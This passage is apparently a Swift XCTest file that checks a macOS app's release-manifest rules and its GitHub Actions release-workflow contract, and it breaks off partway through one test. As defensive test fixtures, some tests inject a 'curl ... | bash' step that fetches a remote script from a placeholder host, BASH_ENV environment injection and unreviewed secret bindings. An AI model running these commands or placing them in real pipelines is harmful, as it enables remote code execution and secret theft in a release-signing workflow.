import Foundation
import XCTest

final class ReleaseManifestScriptTests: XCTestCase {
    private var repositoryRoot: URL {
        URL(fileURLWithPath: FileManager.default.currentDirectoryPath, isDirectory: true)
    }

    func testRepositoryReleaseManifestPassesSchemaAndProjectAlignment() throws {
        let result = try run(
            repositoryRoot.appendingPathComponent("scripts/check-release-manifest.sh"),
            arguments: []
        )

        XCTAssertEqual(result.exitCode, 0, result.stderr)
        XCTAssertTrue(result.stdout.contains("Release manifest OK"))
    }

    func testPublishedReleaseFactsRemainHistoricalAndFutureTagsFailClosed() throws {
        let manifest = try readJSON(
            repositoryRoot.appendingPathComponent(".github/release-manifest.json")
        )
        let product = try XCTUnwrap(manifest["product"] as? [String: Any])
        let policy = try XCTUnwrap(manifest["releasePolicy"] as? [String: Any])
        let history = try XCTUnwrap(manifest["historicalReleases"] as? [[String: Any]])
        let published = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])

        XCTAssertEqual(product["bundleID"] as? String, "tech.reidar.vifty")
        XCTAssertEqual(product["daemonID"] as? String, "tech.reidar.vifty.daemon")
        XCTAssertEqual(product["helperID"] as? String, "tech.reidar.vifty.helper")
        XCTAssertEqual(product["ctlID"] as? String, "tech.reidar.vifty.ctl")
        XCTAssertEqual(product["architectures"] as? [String], ["arm64"])
        XCTAssertEqual(policy["developerTeamID"] as? String, "X88J3853S2")
        XCTAssertEqual(policy["signedTagsRequiredFromVersion"] as? String, "1.3.3")
        XCTAssertTrue(history.isEmpty)
        XCTAssertEqual(published["version"] as? String, "1.3.2")
        XCTAssertEqual(published["build"] as? Int, 7)
        XCTAssertEqual(published["tagTrust"] as? String, "historical-unsigned")
        XCTAssertEqual(published["artifactTrust"] as? String, "passed")
        XCTAssertEqual(published["installedReleaseReview"] as? String, "passed")
        XCTAssertEqual(published["manualCompatibility"] as? String, "passed-auto-restored")
        let compatibilityScope = try XCTUnwrap(
            published["manualCompatibilityScope"] as? [String: Any]
        )
        XCTAssertEqual(
            compatibilityScope["modelIdentifiers"] as? [String],
            ["MacBookPro18,1"]
        )
        XCTAssertEqual(
            compatibilityScope["reviewReport"] as? String,
            "docs/validation-reports/2026-07-14-v1.3.2-macbookpro18-supported/review-result.json"
        )
        XCTAssertEqual(
            compatibilityScope["attestation"] as? String,
            "docs/validation-reports/2026-07-14-v1.3.2-macbookpro18-supported/manual-smoke-attestation.md"
        )
        XCTAssertEqual(manifest["candidate"] as? NSNull, NSNull())
    }

    func testCheckerRejectsPassedManualCompatibilityWithoutScope() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateManifest { manifest in
            var published = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
            published.removeValue(forKey: "manualCompatibilityScope")
            manifest["publishedRelease"] = published
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("publishedRelease.manualCompatibilityScope is required when manualCompatibility is passed-auto-restored"),
            result.stderr
        )
    }

    func testCheckerRejectsNullFutureSignedTagBoundary() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateManifest { manifest in
            var policy = try XCTUnwrap(manifest["releasePolicy"] as? [String: Any])
            policy["signedTagsRequiredFromVersion"] = NSNull()
            manifest["releasePolicy"] = policy
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("signedTagsRequiredFromVersion"), result.stderr)
    }

    func testCheckerRejectsNonMonotonicCandidateBuild() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateManifest { manifest in
            manifest["candidate"] = [
                "version": "1.3.3",
                "build": 7,
                "tag": "v1.3.3",
                "artifact": "Vifty-v1.3.3.zip",
                "checksumAsset": "Vifty-v1.3.3.zip.sha256",
                "artifactSummary": "Vifty-v1.3.3-artifact-summary.json",
                "releaseChecklist": "Vifty-v1.3.3-release-checklist.md",
                "sha256": NSNull(),
                "artifactTrust": "pending",
                "tagTrust": "signed-required",
                "manualCompatibility": "pending",
                "manualCompatibilityScope": NSNull()
            ]
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("candidate build 7 must be greater than published build 7"), result.stderr)
    }

    func testCheckerAcceptsAppendOnlyHistoryCurrentAndCandidateLifecycle() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateManifest { manifest in
            let historical = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
            manifest["historicalReleases"] = [historical]
            manifest["publishedRelease"] = self.publishedEntry(
                basedOn: historical,
                version: "1.3.3",
                build: 8,
                sourceCommit: String(repeating: "b", count: 40)
            )
            manifest["candidate"] = self.candidateEntry(version: "1.3.4", build: 9)
        }

        let result = try fixture.runChecker()

        XCTAssertEqual(result.exitCode, 0, result.stderr)
    }

    func testCheckerRejectsDuplicateVersionAcrossHistoryAndCurrent() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateManifest { manifest in
            let published = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
            manifest["historicalReleases"] = [published]
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("release versions must be unique across history, publishedRelease, and candidate"), result.stderr)
        XCTAssertTrue(result.stderr.contains("release tags must be unique across history, publishedRelease, and candidate"), result.stderr)
    }

    func testCheckerRejectsCurrentReleaseOlderThanHistory() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateManifest { manifest in
            let published = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
            manifest["historicalReleases"] = [self.publishedEntry(
                basedOn: published,
                version: "1.3.3",
                build: 8,
                sourceCommit: String(repeating: "b", count: 40)
            )]
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("publishedRelease version 1.3.2 must be newer than every historical release"), result.stderr)
        XCTAssertTrue(result.stderr.contains("publishedRelease build 7 must be greater than every historical release build"), result.stderr)
    }

    func testCheckerRejectsNonAppendOrderedHistory() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateManifest { manifest in
            let published = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
            let older = self.publishedEntry(
                basedOn: published,
                version: "1.3.0",
                build: 5,
                sourceCommit: String(repeating: "a", count: 40)
            )
            let newer = self.publishedEntry(
                basedOn: published,
                version: "1.3.1",
                build: 6,
                sourceCommit: String(repeating: "b", count: 40)
            )
            manifest["historicalReleases"] = [newer, older]
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("historicalReleases must be append-ordered by increasing version and build"), result.stderr)
    }

    func testHistoryCheckerAcceptsExactTrustedCandidatePromotion() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateManifest { manifest in
            manifest["candidate"] = self.candidateEntry(version: "1.3.3", build: 8)
        }
        try fixture.snapshotCurrentAsBase()
        try fixture.mutateManifest { manifest in
            let previous = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
            manifest["historicalReleases"] = [previous]
            manifest["publishedRelease"] = self.publishedEntry(
                basedOn: previous,
                version: "1.3.3",
                build: 8,
                sourceCommit: String(repeating: "b", count: 40)
            )
            manifest["candidate"] = NSNull()
        }

        let result = try fixture.runHistoryChecker()

        XCTAssertEqual(result.exitCode, 0, result.stderr)
    }

    func testHistoryCheckerRejectsFabricatedDirectPromotionWithoutTrustedCandidate() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateManifest { manifest in
            let previous = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
            manifest["historicalReleases"] = [previous]
            manifest["publishedRelease"] = self.publishedEntry(
                basedOn: previous,
                version: "1.3.3",
                build: 8,
                sourceCommit: String(repeating: "b", count: 40)
            )
        }

        let result = try fixture.runHistoryChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("publishedRelease may change only by promoting the trusted base candidate"),
            result.stderr
        )
    }

    func testHistoryCheckerRejectsProductAndReleasePolicyMutation() throws {
        for field in ["product", "releasePolicy"] {
            let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
            try fixture.mutateManifest { manifest in
                var value = try XCTUnwrap(manifest[field] as? [String: Any])
                value[field == "product" ? "minimumMacOS" : "signedTagsRequiredFromVersion"] =
                    field == "product" ? "14.0" : "9.9.9"
                manifest[field] = value
            }

            let result = try fixture.runHistoryChecker()

            XCTAssertNotEqual(result.exitCode, 0)
            XCTAssertTrue(
                result.stderr.contains("release-manifest authority field \(field) changed"),
                result.stderr
            )
        }
    }

    func testHistoryCheckerRejectsPromotionIdentityDriftAndUnclearedCandidate() throws {
        for mutation in ["identity", "candidate"] {
            let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
            try fixture.mutateManifest { manifest in
                manifest["candidate"] = self.candidateEntry(version: "1.3.3", build: 8)
            }
            try fixture.snapshotCurrentAsBase()
            try fixture.mutateManifest { manifest in
                let previous = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
                manifest["historicalReleases"] = [previous]
                var promoted = self.publishedEntry(
                    basedOn: previous,
                    version: "1.3.3",
                    build: 8,
                    sourceCommit: String(repeating: "b", count: 40)
                )
                if mutation == "identity" {
                    promoted["artifact"] = "Vifty-v1.3.4.zip"
                }
                manifest["publishedRelease"] = promoted
                if mutation != "candidate" {
                    manifest["candidate"] = NSNull()
                }
            }

            let result = try fixture.runHistoryChecker()

            XCTAssertNotEqual(result.exitCode, 0)
            if mutation == "identity" {
                XCTAssertTrue(
                    result.stderr.contains("must preserve trusted base candidate field artifact"),
                    result.stderr
                )
            } else {
                XCTAssertTrue(
                    result.stderr.contains("candidate must be cleared"),
                    result.stderr
                )
            }
        }
    }

    func testHistoryCheckerRejectsFabricatedPostReleaseReviewEvidenceDuringPromotion() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateManifest { manifest in
            manifest["candidate"] = self.candidateEntry(version: "1.3.3", build: 8)
        }
        try fixture.snapshotCurrentAsBase()
        try fixture.mutateManifest { manifest in
            let previous = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
            manifest["historicalReleases"] = [previous]
            var promoted = self.publishedEntry(
                basedOn: previous,
                version: "1.3.3",
                build: 8,
                sourceCommit: String(repeating: "b", count: 40)
            )
            promoted["installedReleaseReview"] = "passed"
            manifest["publishedRelease"] = promoted
            manifest["candidate"] = NSNull()
        }

        let result = try fixture.runHistoryChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("without fabricating post-release review evidence"),
            result.stderr
        )
    }

    func testHistoryCheckerRejectsMutatedPriorHistoryPrefix() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.promoteCurrentManifest(version: "1.3.3", build: 8)
        try fixture.snapshotCurrentAsBase()
        try fixture.mutateManifest { manifest in
            var history = try XCTUnwrap(manifest["historicalReleases"] as? [[String: Any]])
            history[0]["sha256"] = String(repeating: "0", count: 64)
            manifest["historicalReleases"] = history
        }

        let result = try fixture.runHistoryChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("prior historicalReleases prefix changed"), result.stderr)
    }

    func testHistoryCheckerRejectsDeletedOrReorderedHistory() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.promoteCurrentManifest(version: "1.3.3", build: 8)
        try fixture.snapshotCurrentAsBase()
        try fixture.mutateManifest { manifest in
            manifest["historicalReleases"] = []
        }

        let result = try fixture.runHistoryChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("prior historicalReleases prefix changed"), result.stderr)
    }

    func testHistoryCheckerRejectsSkippingPreviousPublishedRelease() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateManifest { manifest in
            let previous = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
            manifest["publishedRelease"] = self.publishedEntry(
                basedOn: previous,
                version: "1.3.3",
                build: 8,
                sourceCommit: String(repeating: "b", count: 40)
            )
        }

        let result = try fixture.runHistoryChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("previous publishedRelease must be appended unchanged"), result.stderr)
    }

    func testHistoryCheckerGrandfathersOnlyExactInitialV132Manifest() throws {
        let fixture = try ReleaseManifestFixture(repositoryRoot: repositoryRoot)

        let accepted = try fixture.runHistoryCheckerWithoutBase()
        XCTAssertEqual(accepted.exitCode, 0, accepted.stderr)

        try fixture.mutateManifest { manifest in
            var published = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
            published["sha256"] = String(repeating: "0", count: 64)
            manifest["publishedRelease"] = published
        }
        let rejected = try fixture.runHistoryCheckerWithoutBase()
        XCTAssertNotEqual(rejected.exitCode, 0)
        XCTAssertTrue(rejected.stderr.contains("initial manifest does not match grandfathered v1.3.2 boundary"), rejected.stderr)
    }

    func testReleaseFactBlocksAreGeneratedFromManifest() throws {
        let result = try run(
            repositoryRoot.appendingPathComponent("scripts/render-release-facts.sh"),
            arguments: ["--check"]
        )

        XCTAssertEqual(result.exitCode, 0, result.stderr)
        XCTAssertTrue(result.stdout.contains("Release fact blocks OK"))
    }

    func testReleaseFactBlocksScopeManualCompatibilityToValidatedModelAndEvidence() throws {
        let readme = try String(
            contentsOf: repositoryRoot.appendingPathComponent("README.md"),
            encoding: .utf8
        )

        XCTAssertTrue(
            readme.contains(
                "manual Fixed/Curve/Auto compatibility `passed-auto-restored` on `MacBookPro18,1` only"
            ),
            readme
        )
        XCTAssertTrue(
            readme.contains(
                "review `docs/validation-reports/2026-07-14-v1.3.2-macbookpro18-supported/review-result.json`"
            ),
            readme
        )
        XCTAssertTrue(
            readme.contains(
                "attestation `docs/validation-reports/2026-07-14-v1.3.2-macbookpro18-supported/manual-smoke-attestation.md`"
            ),
            readme
        )
    }

    func testWorkflowContractUsesPinnedActionsAndLeastPrivilegeJobs() throws {
        let result = try run(
            URL(fileURLWithPath: "/usr/bin/ruby"),
            arguments: [repositoryRoot.appendingPathComponent("scripts/check-workflow-contract.rb").path]
        )

        XCTAssertEqual(result.exitCode, 0, result.stderr)
        XCTAssertTrue(result.stdout.contains("Workflow contract OK"))
        XCTAssertTrue(result.stdout.contains("secret-reference allowlists"))
    }

    func testWorkflowContractUsesKeywordSafeLoadWithStrictModernPsychAPI() throws {
        let strictPsychShim = #"""
        module Psych
          class << self
            alias_method :vifty_original_safe_load, :safe_load

            def safe_load(yaml, permitted_classes:, permitted_symbols:, aliases:, **keywords)
              vifty_original_safe_load(
                yaml,
                permitted_classes: permitted_classes,
                permitted_symbols: permitted_symbols,
                aliases: aliases,
                **keywords
              )
            end
          end
        end

        load ARGV.fetch(0)
        """#
        let result = try run(
            URL(fileURLWithPath: "/usr/bin/ruby"),
            arguments: [
                "-ryaml",
                "-e",
                strictPsychShim,
                "--",
                repositoryRoot.appendingPathComponent("scripts/check-workflow-contract.rb").path
            ]
        )

        XCTAssertEqual(result.exitCode, 0, result.stderr)
        XCTAssertTrue(result.stdout.contains("Workflow contract OK"), result.stdout)
    }

    func testWorkflowContractRejectsShallowCICheckout() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateCIWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "          fetch-depth: 0",
                with: "          fetch-depth: 1"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("every approved checkout must fetch complete history for immutable release verification"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsShallowReleasePrepareCheckout() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            let expected = """
                  - name: Check out signed release tag without credentials
                    uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6
                    with:
                      ref: refs/tags/${{ github.ref_name }}
                      fetch-depth: 0
                      persist-credentials: false
            """
            return workflow.replacingOccurrences(
                of: expected,
                with: expected.replacingOccurrences(of: "fetch-depth: 0", with: "fetch-depth: 1")
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("every approved checkout must fetch complete history for immutable release verification"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsExtraProtectedRunStep() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            let marker = "      - name: Upload verified release assets for publication"
            return workflow.replacingOccurrences(
                of: marker,
                with: """
                      - name: Unexpected protected command
                        run: curl https://example.invalid/unreviewed.sh | bash

                \(marker)
                """
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("step set must match the reviewed allowlist exactly"), result.stderr)
    }

    func testWorkflowContractRejectsUnexpectedSecretBearingJob() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            let marker = "  sign-notarize:\n"
            let replacement = """
              unexpected-secret-job:
                runs-on: macos-15
                permissions:
                  contents: read
                steps:
                  - name: Unexpected secret use
                    env:
                      APPLE_ID: ${{ secrets.APPLE_ID }}
                    run: test -n "${APPLE_ID}"

            \(marker)
            """
            return workflow.replacingOccurrences(of: marker, with: replacement)
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("jobs must be exactly") &&
                result.stderr.contains("secret context references must match"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsTopLevelEnvironmentInjection() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: \"true\"",
                with: "  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: \"true\"\n  BASH_ENV: /tmp/unreviewed"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("top-level env must contain only"), result.stderr)
    }

    func testWorkflowContractRejectsNonAllowlistedSecretBinding() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "APPLE_ID: ${{ secrets.APPLE_ID }}",
                with: "APPLE_ID: ${{ secrets.UNREVIEWED_RELEASE_SECRET }}"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("secret context references must match"), result.stderr)
    }

    func testWorkflowContractRejectsMissingEnvironmentShadowCheck() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseSecretChecker {
            $0.replacingOccurrences(
                of: "safe_gh secret list --env \"${ENVIRONMENT_NAME}\" --repo \"github.com/${REPO}\"",
                with: "safe_gh secret list --repo \"github.com/${REPO}\""
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("release-secret operator preflight must require repository names and reject same-name environment shadows"), result.stderr)
    }

    func testWorkflowContractRejectsGovernanceCheckerWithoutExplicitPosttagState() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseGovernanceChecker {
            $0.replacingOccurrences(
                of: #"posttag_mode ? "administrator-posttag" : "administrator-pretag""#,
                with: #""administrator-pretag""#
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains(
                "exact-ref pre-tag absence or exact-object post-tag presence"
            ),
            result.stderr
        )
    }

    func testWorkflowContractRejectsMatchingRefPushHelperLookup() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutatePushDispatchHelper {
            $0.replacingOccurrences(
                of: #""repos/${REPOSITORY}/git/ref/${namespace}/${name}""#,
                with: #""repos/${REPOSITORY}/git/matching-refs/${namespace}/${name}""#
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains(
                "exact absent-ref compare-and-swap creation"
            ),
            result.stderr
        )
    }

    func testWorkflowContractRejectsPushHelperRetryAuthorization() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutatePushDispatchHelper {
            $0.replacingOccurrences(
                of: #""receiptAuthorizesRetry" => false"#,
                with: #""receiptAuthorizesRetry" => true"#
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains(
                "never authorize retry or resume"
            ),
            result.stderr
        )
    }

    func testWorkflowContractRejectsInvalidShellSyntaxOutsideProtectedJobs() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            let marker = "          swift --version\n\n      - name: Configure SwiftPM build path"
            let replacement = "          swift --version\n          )\n\n      - name: Configure SwiftPM build path"
            return workflow.replacingOccurrences(of: marker, with: replacement)
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("has invalid shell syntax"), result.stderr)
    }

    func testWorkflowContractRejectsUnhashedScriptInReviewedProtectedStep() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            let marker = "            --keychain \"${KEYCHAIN_PATH}\"\n\n      - name: Notarize signed candidate"
            let replacement = "            --keychain \"${KEYCHAIN_PATH}\"\n          bash unlisted.sh\n\n      - name: Notarize signed candidate"
            return workflow.replacingOccurrences(of: marker, with: replacement)
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("reviewed normalized step mapping hash"), result.stderr)
    }

    func testWorkflowContractRejectsPartialTrustedSourceHashInventory() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "            git ls-files -z | xargs -0 shasum -a 256 \\",
                with: "            printf '%s\\0' scripts/verify-release-artifact.sh | xargs -0 shasum -a 256 \\"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("trusted inventory must hash every tracked file"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsMaskedTrustedWorktreeStatusFailure() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: """
                            trusted_status="$(git status --porcelain=v1 --untracked-files=all)"
                            test -z "${trusted_status}"
                """,
                with: """
                            test -z "$(git status --porcelain=v1 --untracked-files=all)"
                """
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("clean trusted worktree and all tracked-file hashes"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsHardcodedCandidateSHAEvidenceSource() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "\"expectedSHASource\" => sha_resolution.fetch(:source)",
                with: "\"expectedSHASource\" => \"expected sha256\""
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("resolved candidate SHA source"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsProtectedStepEnvironmentInjection() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            let marker = "          SIGNING_IDENTITY: ${{ secrets.DEVELOPER_ID_APPLICATION_IDENTITY }}\n          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}\n        run: |"
            let replacement = "          SIGNING_IDENTITY: ${{ secrets.DEVELOPER_ID_APPLICATION_IDENTITY }}\n          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}\n          BASH_ENV: /tmp/unreviewed\n        run: |"
            return workflow.replacingOccurrences(of: marker, with: replacement)
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("reviewed normalized step mapping hash"), result.stderr)
    }

    func testWorkflowContractRejectsAdditionalPermissionScope() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            let marker = "  sign-notarize:\n    name: Sign and notarize inventoried candidate\n    needs: prepare-candidate\n    if: ${{ github.run_attempt == 1 }}\n    runs-on: macos-15\n    timeout-minutes: 25\n    environment: release\n    permissions:\n      actions: read\n      contents: read"
            let replacement = marker + "\n      id-token: write"
            return workflow.replacingOccurrences(of: marker, with: replacement)
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("permissions must be exactly {actions: read, contents: read}"), result.stderr)
    }

    func testWorkflowContractRejectsMissingReleaseEnvironmentReadback() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "\"${TRUSTED_ROOT}/scripts/check-release-environment.sh\"",
                with: "true # release environment check removed"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("fail closed on public release-governance readback") ||
                result.stderr.contains("reviewed normalized step mapping hash"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsMissingTrustedMainContractValidation() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: """
                          VIFTY_WORKFLOW_CONTRACT_ROOT="${TRUSTED_ROOT}" \\
                            ruby "${TRUSTED_ROOT}/scripts/check-workflow-contract.rb"
                """,
                with: "          true # trusted github.sha workflow contract check removed"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("validate the exact trusted github.sha workflow contract") ||
                result.stderr.contains("reviewed normalized step mapping hash"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsWriteJobTokenEnvironmentInjection() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            let marker = "      - name: Recheck downloaded asset identity\n        run: |"
            let replacement = "      - name: Recheck downloaded asset identity\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: |"
            return workflow.replacingOccurrences(of: marker, with: replacement)
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("publish step") && result.stderr.contains("reviewed normalized step mapping hash"), result.stderr)
    }

    func testWorkflowContractRequiresExactTagPushReleaseTrigger() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "\"on\":\n  push:\n    tags:\n      - \"v*\"",
                with: "\"on\":\n  push:\n    tags:\n      - \"release/*\"\n  workflow_dispatch:"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("release workflow must trigger only on pushed tags matching v*"),
            result.stderr
        )
    }

    func testWorkflowContractRequiresPushedTagRunName() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "run-name: Release ${{ github.ref_name }}",
                with: "run-name: Release ${{ github.sha }}"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains(
                ".github/workflows/release.yml run-name must bind the exact pushed tag ref name"
            ),
            result.stderr
        )
    }

    func testWorkflowContractRejectsMutableOrRerunTagPushContext() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow
                .replacingOccurrences(
                    of: #"test "${GITHUB_EVENT_NAME}" = "push""#,
                    with: #"test "${GITHUB_EVENT_NAME}" = "workflow_dispatch""#
                )
                .replacingOccurrences(
                    of: #"test "${GITHUB_RUN_ATTEMPT}" = "1""#,
                    with: #"test "${GITHUB_RUN_ATTEMPT}" -ge "1""#
                )
                .replacingOccurrences(
                    of: #"test "${GITHUB_REF_TYPE}" = "tag""#,
                    with: #"test "${GITHUB_REF_TYPE}" = "branch""#
                )
                .replacingOccurrences(
                    of: #"test "${GITHUB_REF_NAME}" = "${RELEASE_TAG}""#,
                    with: #"test "${GITHUB_REF_NAME}" = "main""#
                )
                .replacingOccurrences(
                    of: #"test "${GITHUB_REF}" = "refs/tags/${RELEASE_TAG}""#,
